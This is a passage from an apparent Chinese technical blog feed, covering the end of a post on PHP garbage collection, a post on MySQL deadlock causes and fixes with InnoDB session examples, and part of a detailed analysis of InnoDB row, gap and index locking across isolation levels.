<p>在我的机器环境下，运行时间分别为6.4s和7.2s，可以看到PHP5.3的垃圾回收机制会慢一些，但是影响并不大。</p>
<h1 id="与垃圾回收算法相关的PHP配置"><a href="#与垃圾回收算法相关的PHP配置" class="headerlink" title="与垃圾回收算法相关的PHP配置"></a>与垃圾回收算法相关的PHP配置</h1><p>可以通过修改php.ini中的zend.enable_gc来打开或关闭PHP的垃圾回收机制，也可以通过调用gc_enable()或gc_disable()打开或关闭PHP的垃圾回收机制。在PHP5.3中即使关闭了垃圾回收机制，PHP仍然会记录可能根到根缓冲区，只是当根缓冲区满额时，PHP不会自动运行垃圾回收，当然，任何时候您都可以通过手工调用gc_collect_cycles()函数强制执行内存回收。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 死锁问题及解决</title>
    <url>/2017/04/20/mysql-%E6%AD%BB%E9%94%81%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<p><strong>死锁（Deadlock）</strong><br>所谓死锁：是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。由于资源占用是互斥的，当某个进程提出申请资源后，使得有关进程在无外力协助下，永远分配不到必需的资源而无法继续运行，这就产生了一种特殊现象死锁。 一种情形，此时执行程序中两个或多个线程发生永久堵塞（等待），每个线程都在等待被其他线程占用并堵塞了的资源。例如，如果线程A锁住了记录1并等待记录2，而线程B锁住了记录2并等待记录1，这样两个线程就发生了死锁现象。计算机系统中,如果系统的资源分配策略不当，更常见的可能是程序员写的程序有错误等，则会导致进程因竞争资源不当而产生死锁的现象。锁有多种实现方式，比如意向锁，共享－排他锁，锁表，树形协议，时间戳协议等等。锁还有多种粒度，比如可以在表上加锁，也可以在记录上加锁。<br><strong>产生死锁的原因主要是：</strong><br>（1）系统资源不足。<br>（2） 进程运行推进的顺序不合适。<br>（3）资源分配不当等。 如果系统资源充足，进程的资源请求都能够得到满足，死锁出现的可能性就很低，否则就会因争夺有限的资源而陷入死锁。其次，进程运行推进顺序与速度不同，也可能产生死锁。</p>
<p><strong>产生死锁的四个必要条件：</strong><br>（1） 互斥条件：一个资源每次只能被一个进程使用。<br>（2） 请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。<br>（3） 不剥夺条件:进程已获得的资源，在末使用完之前，不能强行剥夺。<br>（4） 循环等待条件:若干进程之间形成一种头尾相接的循环等待资源关系。 这四个条件是死锁的必要条件，只要系统发生死锁，这些条件必然成立，而只要上述条件之一不满足，就不会发生死锁。<br> <strong>死锁的预防和解除：</strong><br> 理解了死锁的原因，尤其是产生死锁的四个必要条件，就可以最大可能地避免、预防和解除死锁。所以，在系统设计、进程调度等方面注意如何不让这四个必要条件成立，如何确定资源的合理分配算法，避免进程永久占据系统资源。此外，也要防止进程在处于等待状态的情况下占用资源,在系统运行过程中，对进程发出的每一个系统能够满足的资源申请进行动态检查，并根据检查结果决定是否分配资源，若分配后系统可能发生死锁，则不予分配，否则予以分配 。因此，对资源的分配要给予合理的规划。<br> <strong>如何将死锁减至最少</strong><br> 虽然不能完全避免死锁，但可以使死锁的数量减至最少。将死锁减至最少可以增加事务的吞吐量并减少系统开销，因为只有很少的事务回滚，而回滚会取消事务执行的所有工作。由于死锁时回滚而由应用程序重新提交。<br> <strong>下列方法有助于最大限度地降低死锁：</strong><br> （1）按同一顺序访问对象。<br> （2）避免事务中的用户交互。<br> （3）保持事务简短并在一个批处理中。<br> （4）使用低隔离级别。<br> （5）使用绑定连接。<br> <strong>按同一顺序访问对象</strong><br> 如果所有并发事务按同一顺序访问对象，则发生死锁的可能性会降低。例如，如果两个并发事务获得 Supplier 表上的锁，然后获得 Part 表上的锁，则在其中一个事务完成之前，另一个事务被阻塞在 Supplier 表上。第一个事务提交或回滚后，第二个事务继续进行。不发生死锁。将存储过程用于所有的数据修改可以标准化访问对象的顺序。<br> <strong>避免事务中的用户交互</strong><br> 避免编写包含用户交互的事务，因为运行没有用户交互的批处理的速度要远远快于用户手动响应查询的速度，例如答复应用程序请求参数的提示。例如，如果事务正在等待用户输入，而用户去吃午餐了或者甚至回家过周末了，则用户将此事务挂起使之不能完成。这样将降低系统的吞吐量，因为事务持有的任何锁只有在事务提交或回滚时才会释放。即使不出现死锁的情况，访问同一资源的其它事务也会被阻塞，等待该事务完成。<br> <strong>保持事务简短并在一个批处理中</strong><br>在同一数据库中并发执行多个需要长时间运行的事务时通常发生死锁。事务运行时间越长，其持有排它锁或更新锁的时间也就越长，从而堵塞了其它活动并可能导致死锁。 保持事务在一个批处理中，可以最小化事务的网络通信往返量，减少完成事务可能的延迟并释放锁。<br><strong>使用低隔离级别</strong> 确定事务是否能在更低的隔离级别上运行。执行提交读允许事务读取另一个事务已读取（未修改）的数据，而不必等待第一个事务完成。使用较低的隔离级别（例如提交读）而不使用较高的隔离级别（例如可串行读）可以缩短持有共享锁的时间，从而降低了锁定争夺。 <strong>使用绑定连接</strong> 使用绑定连接使同一应用程序所打开的两个或多个连接可以相互合作。次级连接所获得的任何锁可以象由主连接获得的锁那样持有，反之亦然，因此不会相互阻塞。   <strong>死锁案例：</strong> <strong>案例一：</strong> 需求：将投资的钱拆成几份随机分配给借款人。 起初业务程序思路是这样的： 投资人投资后，将金额随机分为几份，然后随机从借款人表里面选几个，然后通过一条条select for update 去更新借款人表里面的余额等。   抽象出来就是一个session通过for循环会有几条如下的语句： Select * from xxx where id=’随机id’ for update   基本来说，程序开启后不一会就死锁。 这可以是说最经典的死锁情形了。   例如两个用户同时投资，A用户金额随机分为2份，分给借款人1，2 B用户金额随机分为2份，分给借款人2，1 由于加锁的顺序不一样，死锁当然很快就出现了。   <strong>对于这个问题的改进很简单，直接把所有分配到的借款人直接一次锁住就行了。</strong> *<em>Select * from xxx where id in (xx,xx,xx) for update*</em> <strong>在in**</strong>里面的列表值mysql**<strong>是会自动从小到大排序，加锁也是一条条从小到大加的锁</strong>    </p>
<p>例如（以下会话id为主键）：</p>
<p>Session1:</p>
<p>mysql&gt; select * from t3 where id in (8,9) for update;</p>
<p>+—-+——–+——+———————+</p>
<p>| id | course | name | ctime               |</p>
<p>+—-+——–+——+———————+</p>
<p>|  8 | WA     | f    | 2016-03-02 11:36:30 |</p>
<p>|  9 | JX     | f    | 2016-03-01 11:36:30 |</p>
<p>+—-+——–+——+———————+</p>
<p>2 rows in set (0.04 sec)</p>
<p>Session2:</p>
<p>select * from t3 where id in (10,8,5) for update;</p>
<p>锁等待中……</p>
<p>其实这个时候id=10这条记录没有被锁住的，但id=5的记录已经被锁住了，锁的等待在id=8的这里。</p>
<p>不信请看</p>
<p>Session3:</p>
<p>mysql&gt; select * from t3 where id=5 for update;</p>
<p>锁等待中</p>
<p>Session4:</p>
<p>mysql&gt; select * from t3 where id=10 for update;</p>
<p>+—-+——–+——+———————+</p>
<p>| id | course | name | ctime               |</p>
<p>+—-+——–+——+———————+</p>
<p>| 10 | JB     | g    | 2016-03-10 11:45:05 |</p>
<p>+—-+——–+——+———————+</p>
<p>1 row in set (0.00 sec)</p>
<p>在其它session中id=5是加不了锁的，但是id=10是可以加上锁的。</p>
<p><strong>案例2</strong><br>在开发中，经常会做这类的判断需求：根据字段值查询（有索引），如果不存在，则插入；否则更新。  </p>
<p>以id为主键为例，目前还没有id=22的行</p>
<p>Session1:</p>
<p>select * from t3 where id=22 for update;</p>
<p>Empty set (0.00 sec)</p>
<p>session2:</p>
<p>select * from t3 where id=23  for update;</p>
<p>Empty set (0.00 sec)</p>
<p>Session1:</p>
<p>insert into t3 values(22,’ac’,’a’,now());</p>
<p>锁等待中……</p>
<p>Session2:</p>
<p>insert into t3 values(23,’bc’,’b’,now());</p>
<p>ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction</p>
<p>  当对存在的行进行锁的时候(主键)，mysql就只有行锁。 当对未存在的行进行锁的时候(即使条件为主键)，mysql是会锁住一段范围（有gap锁）     锁住的范围为： (无穷小或小于表中锁住id的最大值，无穷大或大于表中锁住id的最小值)   如：如果表中目前有已有的id为（11 ， 12） 那么就锁住（12，无穷大） 如果表中目前已有的id为（11 ， 30） 那么就锁住（11，30）  <br> <strong>对于这种死锁的解决办法是：</strong> <strong>insert into t3(xx,xx) on duplicate key update `xx`=’XX’;</strong>  <br> 用mysql特有的语法来解决此问题。因为insert语句对于主键来说，插入的行不管有没有存在，都会只有行锁。    <br> <strong>案例3</strong> 直接上情景：</p>
<p>mysql&gt; select * from t3 where id=9 for update;</p>
<p>+—-+——–+——+———————+</p>
<p>| id | course | name | ctime               |</p>
<p>+—-+——–+——+———————+</p>
<p>|  9 | JX     | f    | 2016-03-01 11:36:30 |</p>
<p>+—-+——–+——+———————+</p>
<p>1 row in set (0.00 sec)</p>
<p>Session2:</p>
<p>mysql&gt; select * from t3 where id&lt;20 for update;</p>
<p>锁等待中</p>
<p>Session1:</p>
<p>mysql&gt; insert into t3 values(7,’ae’,’a’,now());</p>
<p>ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction</p>
<p>  这个跟案例一其它是差不多的情况，只是session1不按常理出牌了， Session2在等待Session1的id=9的锁，session2又持了1到8的锁（注意9到19的范围并没有被session2锁住），最后，session1在插入新行时又得等待session2,故死锁发生了。   这种一般是在业务需求中基本不会出现，因为你锁住了id=9，却又想插入id=7的行，这就有点跳了，当然肯定也有解决的方法，那就是重理业务需求，避免这样的写法。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 加锁处理分析</title>
    <url>/2017/04/05/mysql-%E5%8A%A0%E9%94%81%E5%A4%84%E7%90%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><strong>1</strong>    <strong>背景    1</strong> 1.1    MVCC：Snapshot Read vs Current Read    2 1.2    Cluster Index：聚簇索引    3 1.3    2PL：Two-Phase Locking    3 1.4    Isolation Level    4 <strong>2</strong>    <strong>一条简单SQL的加锁实现分析    5</strong> 2.1    组合一：id主键+RC    6 2.2    组合二：id唯一索引+RC    6 2.3    组合三：id非唯一索引+RC    7 2.4    组合四：id无索引+RC    8 2.5    组合五：id主键+RR    9 2.6    组合六：id唯一索引+RR    9 2.7    组合七：id非唯一索引+RR    9 2.8    组合八：id无索引+RR    11 2.9    组合九：Serializable    12 <strong>3</strong>    <strong>一条复杂的SQL    12</strong> <strong>4</strong>    <strong>死锁原理与分析    14</strong> <strong>5</strong>    <strong>总结    16</strong>  </p>
<ol>
<li><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a><strong>背景</strong></h1></li>
</ol>
<p>  MySQL/InnoDB的加锁分析，一直是一个比较困难的话题。我在工作过程中，经常会有同事咨询这方面的问题。同时，微博上也经常会收到MySQL锁相关的私信，让我帮助解决一些死锁的问题。本文，准备就MySQL/InnoDB的加锁问题，展开较为深入的分析与讨论，主要是介绍一种思路，运用此思路，拿到任何一条SQL语句，都能完整的分析出这条语句会加什么锁？会有什么样的使用风险？甚至是分析线上的一个死锁场景，了解死锁产生的原因。   <strong>注：</strong>MySQL是一个支持插件式存储引擎的数据库系统。本文下面的所有介绍，都是基于InnoDB存储引擎，其他引擎的表现，会有较大的区别。</p>
<ol>
<li><h2 id="MVCC：Snapshot-Read-vs-Current-Read"><a href="#MVCC：Snapshot-Read-vs-Current-Read" class="headerlink" title="MVCC：Snapshot Read vs Current Read"></a><strong>MVCC：Snapshot Read vs Current Read</strong></h2></li>
</ol>
<p>  MySQL InnoDB存储引擎，实现的是基于多版本的并发控制协议——MVCC (<a href="http://en.wikipedia.org/wiki/Multiversion_concurrency_control">Multi-Version Concurrency Control</a>) (注：与MVCC相对的，是基于锁的并发控制，Lock-Based Concurrency Control)。MVCC最大的好处，相信也是耳熟能详：读不加锁，读写不冲突。在读多写少的OLTP应用中，读写不冲突是非常重要的，极大的增加了系统的并发性能，这也是为什么现阶段，几乎所有的RDBMS，都支持了MVCC。   在MVCC并发控制中，读操作可以分成两类：快照读 (snapshot read)与当前读 (current read)。快照读，读取的是记录的可见版本 (有可能是历史版本)，不用加锁。当前读，读取的是记录的最新版本，并且，当前读返回的记录，都会加上锁，保证其他事务不会再并发修改这条记录。   在一个支持MVCC并发控制的系统中，哪些读操作是快照读？哪些操作又是当前读呢？以MySQL InnoDB为例：  </p>
<ul>
<li><p><strong>快照读：</strong>简单的select操作，属于快照读，不加锁。(当然，也有例外，下面会分析)</p>
<ul>
<li>select * from table where ?;</li>
</ul>
</li>
<li><p><strong>当前读：</strong>特殊的读操作，插入/更新/删除操作，属于当前读，需要加锁。</p>
<ul>
<li><p>select * from table where ? lock in share mode;</p>
</li>
<li><p>select * from table where ? for update;</p>
</li>
<li><p>insert into table values (…);</p>
</li>
<li><p>update table set ? where ?;</p>
</li>
<li><p>delete from table where ?;<br>所有以上的语句，都属于当前读，读取记录的最新版本。并且，读取之后，还需要保证其他并发事务不能修改当前记录，对读取记录加锁。其中，除了第一条语句，对读取记录加S锁 (共享锁)外，其他的操作，都加的是X锁 (排它锁)。  </p>
</li>
</ul>
</li>
</ul>
<p>为什么将 插入/更新/删除 操作，都归为当前读？可以看看下面这个 更新 操作，在数据库中的执行流程： <a href="http://www.yupoo.com/photos/hedengcheng/90010766/" title="update 执行流程"><img src="http://pic.yupoo.com/hedengcheng/DnJ6RwcV/medish.jpg" alt="update 执行流程"></a> 从图中，可以看到，一个Update操作的具体流程。当Update SQL被发给MySQL后，MySQL Server会根据where条件，读取第一条满足条件的记录，然后InnoDB引擎会将第一条记录返回，并加锁 (current read)。待MySQL Server收到这条加锁的记录之后，会再发起一个Update请求，更新这条记录。一条记录操作完成，再读取下一条记录，直至没有满足条件的记录为止。因此，Update操作内部，就包含了一个当前读。同理，Delete操作也一样。Insert操作会稍微有些不同，简单来说，就是Insert操作可能会触发Unique Key的冲突检查，也会进行一个当前读。   <strong>注</strong>：根据上图的交互，针对一条当前读的SQL语句，InnoDB与MySQL Server的交互，是一条一条进行的，因此，加锁也是一条一条进行的。先对一条满足条件的记录加锁，返回给MySQL Server，做一些DML操作；然后在读取下一条加锁，直至读取完毕。  </p>
<ol>
<li><h2 id="Cluster-Index：聚簇索引"><a href="#Cluster-Index：聚簇索引" class="headerlink" title="Cluster Index：聚簇索引"></a><strong>Cluster Index：聚簇索引</strong></h2></li>
</ol>
<p>  InnoDB存储引擎的数据组织方式，是聚簇索引表：完整的记录，存储在主键索引中，通过主键索引，就可以获取记录所有的列。关于聚簇索引表的组织方式，可以参考MySQL的官方文档：<a href="http://dev.mysql.com/doc/refman/5.0/en/innodb-index-types.html">Clustered and Secondary Indexes</a> 。本文假设读者对这个，已经有了一定的认识，就不再做具体的介绍。接下来的部分，主键索引/聚簇索引 两个名称，会有一些混用，望读者知晓。  </p>
<ol>
<li><h2 id="2PL：Two-Phase-Locking"><a href="#2PL：Two-Phase-Locking" class="headerlink" title="2PL：Two-Phase Locking"></a><strong>2PL：Two-Phase Locking</strong></h2></li>
</ol>
<p>  传统RDBMS加锁的一个原则，就是2PL (二阶段锁)：<a href="http://en.wikipedia.org/wiki/Two-phase_locking">Two-Phase Locking</a>。相对而言，2PL比较容易理解，说的是锁操作分为两个阶段：加锁阶段与解锁阶段，并且保证加锁阶段与解锁阶段不相交。下面，仍旧以MySQL为例，来简单看看2PL在MySQL中的实现。   <a href="http://www.yupoo.com/photos/hedengcheng/90010758/" title="2PL"><img src="http://pic.yupoo.com/hedengcheng/DnJ6Q15k/medish.jpg" alt="2PL"></a> 从上图可以看出，2PL就是将加锁/解锁分为两个完全不相交的阶段。加锁阶段：只加锁，不放锁。解锁阶段：只放锁，不加锁。  </p>
<ol>
<li><h2 id="Isolation-Level"><a href="#Isolation-Level" class="headerlink" title="Isolation Level"></a><strong>Isolation Level</strong></h2></li>
</ol>
<p>  隔离级别：<a href="http://en.wikipedia.org/wiki/Isolation_(database_systems)">Isolation Level</a>，也是RDBMS的一个关键特性。相信对数据库有所了解的朋友，对于4种隔离级别：Read Uncommited，Read Committed，Repeatable Read，Serializable，都有了深入的认识。本文不打算讨论数据库理论中，是如何定义这4种隔离级别的含义的，而是跟大家介绍一下MySQL/InnoDB是如何定义这4种隔离级别的。   MySQL/InnoDB定义的4种隔离级别：</p>
<ul>
<li><p><strong>Read Uncommited</strong></p>
<p>可以读取未提交记录。此隔离级别，不会使用，忽略。</p>
</li>
<li><p><strong>Read Committed (RC)</strong></p>
<p>快照读忽略，本文不考虑。 针对当前读，**RC隔离级别保证对读取到的记录加锁 (记录锁)**，存在幻读现象。</p>
</li>
<li><p><strong>Repeatable Read (RR)</strong></p>
<p>快照读忽略，本文不考虑。 针对当前读，**RR隔离级别保证对读取到的记录加锁 (记录锁)，同时保证对读取的范围加锁，新的满足查询条件的记录不能够插入 (间隙锁)**，不存在幻读现象。</p>
</li>
<li><p><strong>Serializable</strong></p>
<p>从MVCC并发控制退化为基于锁的并发控制。不区别快照读与当前读，所有的读操作均为当前读，读加读锁 (S锁)，写加写锁 (X锁)。 Serializable隔离级别下，读写冲突，因此并发度急剧下降，在MySQL/InnoDB下不建议使用。</p>
</li>
</ul>
<p> </p>
<ol>
<li><h1 id="一条简单SQL的加锁实现分析"><a href="#一条简单SQL的加锁实现分析" class="headerlink" title="一条简单SQL的加锁实现分析"></a><strong>一条简单SQL的加锁实现分析</strong></h1></li>
</ol>
<p>  在介绍完一些背景知识之后，本文接下来将选择几个有代表性的例子，来详细分析MySQL的加锁处理。当然，还是从最简单的例子说起。经常有朋友发给我一个SQL，然后问我，这个SQL加什么锁？就如同下面两条简单的SQL，他们加什么锁？  </p>
<ul>
<li><p><strong>SQL1：</strong>select * from t1 where id = 10;</p>
</li>
<li><p><strong>SQL2：</strong>delete from t1 where id = 10;</p>
</li>
</ul>
<p>  针对这个问题，该怎么回答？我能想象到的一个答案是：  </p>
<ul>
<li><p><strong>SQL1：</strong>不加锁。因为MySQL是使用多版本并发控制的，读不加锁。</p>
</li>
<li><p><strong>SQL2：</strong>对id = 10的记录加写锁 (走主键索引)。</p>
</li>
</ul>
<p>  这个答案对吗？说不上来。即可能是正确的，也有可能是错误的，已知条件不足，这个问题没有答案。如果让我来回答这个问题，我必须还要知道以下的一些前提，前提不同，我能给出的答案也就不同。要回答这个问题，还缺少哪些前提条件？  </p>
<ul>
<li><strong>前提一：</strong>id列是不是主键？</li>
</ul>
<p> </p>
<ul>
<li><strong>前提二：</strong>当前系统的隔离级别是什么？</li>
</ul>
<ul>
<li><strong>前提三：</strong>id列如果不是主键，那么id列上有索引吗？</li>
</ul>
<ul>
<li><strong>前提四：</strong>id列上如果有二级索引，那么这个索引是唯一索引吗？</li>
</ul>
<ul>
<li><strong>前提五：</strong>两个SQL的执行计划是什么？索引扫描？全表扫描？</li>
</ul>
<p>  没有这些前提，直接就给定一条SQL，然后问这个SQL会加什么锁，都是很业余的表现。而当这些问题有了明确的答案之后，给定的SQL会加什么锁，也就一目了然。下面，我将这些问题的答案进行组合，然后按照从易到难的顺序，逐个分析每种组合下，对应的SQL会加哪些锁？   <strong>注：</strong>下面的这些组合，我做了一个前提假设，也就是有索引时，执行计划一定会选择使用索引进行过滤 (索引扫描)。但实际情况会复杂很多，真正的执行计划，还是需要根据MySQL输出的为准。  </p>
<ul>
<li><p><strong>组合一：</strong>id列是主键，RC隔离级别</p>
</li>
<li><p><strong>组合二：</strong>id列是二级唯一索引，RC隔离级别</p>
</li>
<li><p><strong>组合三：</strong>id列是二级非唯一索引，RC隔离级别</p>
</li>
<li><p><strong>组合四：</strong>id列上没有索引，RC隔离级别</p>
</li>
<li><p><strong>组合五：</strong>id列是主键，RR隔离级别</p>
</li>
<li><p><strong>组合六：</strong>id列是二级唯一索引，RR隔离级别</p>
</li>
<li><p><strong>组合七：</strong>id列是二级非唯一索引，RR隔离级别</p>
</li>
<li><p><strong>组合八：</strong>id列上没有索引，RR隔离级别</p>
</li>
<li><p><strong>组合九：</strong>Serializable隔离级别</p>
</li>
</ul>
<p>  排列组合还没有列举完全，但是看起来，已经很多了。真的有必要这么复杂吗？事实上，要分析加锁，就是需要这么复杂。但是从另一个角度来说，只要你选定了一种组合，SQL需要加哪些锁，其实也就确定了。接下来，就让我们来逐个分析这9种组合下的SQL加锁策略。   注：在前面八种组合下，也就是RC，RR隔离级别下，SQL1：select操作均不加锁，采用的是快照读，因此在下面的讨论中就忽略了，主要讨论SQL2：delete操作的加锁。  </p>
<ol>
<li><h2 id="组合一：id主键-RC"><a href="#组合一：id主键-RC" class="headerlink" title="组合一：id主键+RC"></a><strong>组合一：id主键+RC</strong></h2></li>
</ol>
<p>  这个组合，是最简单，最容易分析的组合。id是主键，Read Committed隔离级别，给定SQL：delete from t1 where id = 10; 只需要将主键上，id = 10的记录加上X锁即可。如下图所示： <a href="http://www.yupoo.com/photos/hedengcheng/90010765/" title="id主键+rc"><img src="http://pic.yupoo.com/hedengcheng/DnJ6RtaP/medish.jpg" alt="id主键+rc"></a> <strong>结论：</strong>id是主键时，此SQL只需要在id=10这条记录上加X锁即可。  </p>
<ol>
<li><h2 id="组合二：id唯一索引-RC"><a href="#组合二：id唯一索引-RC" class="headerlink" title="组合二：id唯一索引+RC"></a><strong>组合二：id唯一索引+RC</strong></h2></li>
</ol>
<p>  这个组合，id不是主键，而是一个Unique的二级索引键值。那么在RC隔离级别下，delete from t1 where id = 10; 需要加什么锁呢？见下图： <a href="http://www.yupoo.com/photos/hedengcheng/90010759/" title="id unique+rc"><img src="http://pic.yupoo.com/hedengcheng/DnJ6PDep/medish.jpg" alt="id unique+rc"></a> 此组合中，id是unique索引，而主键是name列。此时，加锁的情况由于组合一有所不同。由于id是unique索引，因此delete语句会选择走id列的索引进行where条件的过滤，在找到id=10的记录后，首先会将unique索引上的id=10索引记录加上X锁，同时，会根据读取到的name列，回主键索引(聚簇索引)，然后将聚簇索引上的name = ‘d’ 对应的主键索引项加X锁。为什么聚簇索引上的记录也要加锁？试想一下，如果并发的一个SQL，是通过主键索引来更新：update t1 set id = 100 where name = ‘d’; 此时，如果delete语句没有将主键索引上的记录加锁，那么并发的update就会感知不到delete语句的存在，违背了同一记录上的更新/删除需要串行执行的约束。   <strong>结论</strong>：若id列是unique列，其上有unique索引。那么SQL需要加两个X锁，一个对应于id unique索引上的id = 10的记录，另一把锁对应于聚簇索引上的[name=’d’,id=10]的记录。  </p>
<ol>
<li><h2 id="组合三：id非唯一索引-RC"><a href="#组合三：id非唯一索引-RC" class="headerlink" title="组合三：id非唯一索引+RC"></a><strong>组合三：id非唯一索引+RC</strong></h2></li>
</ol>
<p>  相对于组合一、二，组合三又发生了变化，隔离级别仍旧是RC不变，但是id列上的约束又降低了，id列不再唯一，只有一个普通的索引。假设delete from t1 where id = 10; 语句，仍旧选择id列上的索引进行过滤where条件，那么此时会持有哪些锁？同样见下图： <a href="http://www.yupoo.com/photos/hedengcheng/90010762/" title="id 非唯一索引+rc"><img src="http://pic.yupoo.com/hedengcheng/DnJ6RA8t/medish.jpg" alt="id 非唯一索引+rc"></a> 根据此图，可以看到，首先，id列索引上，满足id = 10查询条件的记录，均已加锁。同时，这些记录对应的主键索引上的记录也都加上了锁。与组合二唯一的区别在于，组合二最多只有一个满足等值查询的记录，而组合三会将所有满足查询条件的记录都加锁。   <strong>结论</strong>：若id列上有非唯一索引，那么对应的所有满足SQL查询条件的记录，都会被加锁。同时，这些记录在主键索引上的记录，也会被加锁。  </p>
<ol>
<li><h2 id="组合四：id无索引-RC"><a href="#组合四：id无索引-RC" class="headerlink" title="组合四：id无索引+RC"></a><strong>组合四：id无索引+RC</strong></h2></li>
</ol>
<p>  相对于前面三个组合，这是一个比较特殊的情况。id列上没有索引，where id = 10;这个过滤条件，没法通过索引进行过滤，那么只能走全表扫描做过滤。对应于这个组合，SQL会加什么锁？或者是换句话说，全表扫描时，会加什么锁？这个答案也有很多：有人说会在表上加X锁；有人说会将聚簇索引上，选择出来的id = 10;的记录加上X锁。那么实际情况呢？请看下图： <a href="http://www.yupoo.com/photos/hedengcheng/90010763/" title="id 无索引+rc"><img src="http://pic.yupoo.com/hedengcheng/DnJ6Rt0M/medish.jpg" alt="id 无索引+rc"></a> 由于id列上没有索引，因此只能走聚簇索引，进行全部扫描。从图中可以看到，满足删除条件的记录有两条，但是，聚簇索引上所有的记录，都被加上了X锁。无论记录是否满足条件，全部被加上X锁。既不是加表锁，也不是在满足条件的记录上加行锁。   有人可能会问？为什么不是只在满足条件的记录上加锁呢？这是由于MySQL的实现决定的。如果一个条件无法通过索引快速过滤，那么存储引擎层面就会将所有记录加锁后返回，然后由MySQL Server层进行过滤。因此也就把所有的记录，都锁上了。   注：在实际的实现中，MySQL有一些改进，在MySQL Server过滤条件，发现不满足后，会调用unlock_row方法，把不满足条件的记录放锁 (违背了2PL的约束)。这样做，保证了最后只会持有满足条件记录上的锁，但是每条记录的加锁操作还是不能省略的。   <strong>结论：</strong>若id列上没有索引，SQL会走聚簇索引的全扫描进行过滤，由于过滤是由MySQL Server层面进行的。因此每条记录，无论是否满足条件，都会被加上X锁。但是，为了效率考量，MySQL做了优化，对于不满足条件的记录，会在判断后放锁，最终持有的，是满足条件的记录上的锁，但是不满足条件的记录上的加锁/放锁动作不会省略。同时，优化也违背了2PL的约束。  </p>
<ol>
<li><h2 id="组合五：id主键-RR"><a href="#组合五：id主键-RR" class="headerlink" title="组合五：id主键+RR"></a><strong>组合五：id主键+RR</strong></h2></li>
</ol>
<p>  上面的四个组合，都是在Read Committed隔离级别下的加锁行为，接下来的四个组合，是在Repeatable Read隔离级别下的加锁行为。   组合五，id列是主键列，Repeatable Read隔离级别，针对delete from t1 where id = 10; 这条SQL，加锁与组合一：[<a href="http://hedengcheng.com/?p=771#_%E7%BB%84%E5%90%88%E4%B8%80%EF%BC%9Aid%E4%B8%BB%E9%94%AE+RC">id主键，Read Committed</a>]一致。  </p>
<ol>
<li><h2 id="组合六：id唯一索引-RR"><a href="#组合六：id唯一索引-RR" class="headerlink" title="组合六：id唯一索引+RR"></a><strong>组合六：id唯一索引+RR</strong></h2></li>
</ol>
<p>  与组合五类似，组合六的加锁，与组合二：[<a href="http://hedengcheng.com/?p=771#_%E7%BB%84%E5%90%88%E4%BA%8C%EF%BC%9Aid%E5%94%AF%E4%B8%80%E7%B4%A2%E5%BC%95+RC">id唯一索引，Read Committed</a>]一致。两个X锁，id唯一索引满足条件的记录上一个，对应的聚簇索引上的记录一个。  </p>
<ol>
<li><h2 id="组合七：id非唯一索引-RR"><a href="#组合七：id非唯一索引-RR" class="headerlink" title="组合七：id非唯一索引+RR"></a><strong>组合七：id非唯一索引+RR</strong></h2></li>
</ol>
<p>  还记得前面提到的MySQL的四种隔离级别的区别吗？RC隔离级别允许幻读，而RR隔离级别，不允许存在幻读。但是在组合五、组合六中，加锁行为又是与RC下的加锁行为完全一致。那么RR隔离级别下，如何防止幻读呢？问题的答案，就在组合七中揭晓。   组合七，Repeatable Read隔离级别，id上有一个非唯一索引，执行delete from t1 where id = 10; 假设选择id列上的索引进行条件过滤，最后的加锁行为，是怎么样的呢？同样看下面这幅图： <a href="http://www.yupoo.com/photos/hedengcheng/90010761/" title="id 非唯一索引 + rr"><img src="http://pic.yupoo.com/hedengcheng/DnJ6R7wu/medish.jpg" alt="id 非唯一索引 + rr"></a> 此图，相对于组合三：[<a href="http://hedengcheng.com/?p=771#_%E7%BB%84%E5%90%88%E4%B8%89%EF%BC%9Aid%E9%9D%9E%E5%94%AF%E4%B8%80%E7%B4%A2%E5%BC%95+RC">id列上非唯一锁，Read Committed</a>]看似相同，其实却有很大的区别。最大的区别在于，这幅图中多了一个GAP锁，而且GAP锁看起来也不是加在记录上的，倒像是加载两条记录之间的位置，GAP锁有何用？   其实这个多出来的GAP锁，就是RR隔离级别，相对于RC隔离级别，不会出现幻读的关键。确实，GAP锁锁住的位置，也不是记录本身，而是两条记录之间的GAP。所谓幻读，就是同一个事务，连续做两次当前读 (例如：select * from t1 where id = 10 for update;)，那么这两次当前读返回的是完全相同的记录 (记录数量一致，记录本身也一致)，第二次的当前读，不会比第一次返回更多的记录 (幻象)。   如何保证两次当前读返回一致的记录，那就需要在第一次当前读与第二次当前读之间，其他的事务不会插入新的满足条件的记录并提交。为了实现这个功能，GAP锁应运而生。   如图中所示，有哪些位置可以插入新的满足条件的项 (id = 10)，考虑到B+树索引的有序性，满足条件的项一定是连续存放的。记录[6,c]之前，不会插入id=10的记录；[6,c]与[10,b]间可以插入[10, aa]；[10,b]与[10,d]间，可以插入新的[10,bb],[10,c]等；[10,d]与[11,f]间可以插入满足条件的[10,e],[10,z]等；而[11,f]之后也不会插入满足条件的记录。因此，为了保证[6,c]与[10,b]间，[10,b]与[10,d]间，[10,d]与[11,f]不会插入新的满足条件的记录，MySQL选择了用GAP锁，将这三个GAP给锁起来。   Insert操作，如insert [10,aa]，首先会定位到[6,c]与[10,b]间，然后在插入前，会检查这个GAP是否已经被锁上，如果被锁上，则Insert不能插入记录。因此，通过第一遍的当前读，不仅将满足条件的记录锁上 (X锁)，与组合三类似。同时还是增加3把GAP锁，将可能插入满足条件记录的3个GAP给锁上，保证后续的Insert不能插入新的id=10的记录，也就杜绝了同一事务的第二次当前读，出现幻象的情况。   有心的朋友看到这儿，可以会问：既然防止幻读，需要靠GAP锁的保护，为什么组合五、组合六，也是RR隔离级别，却不需要加GAP锁呢？   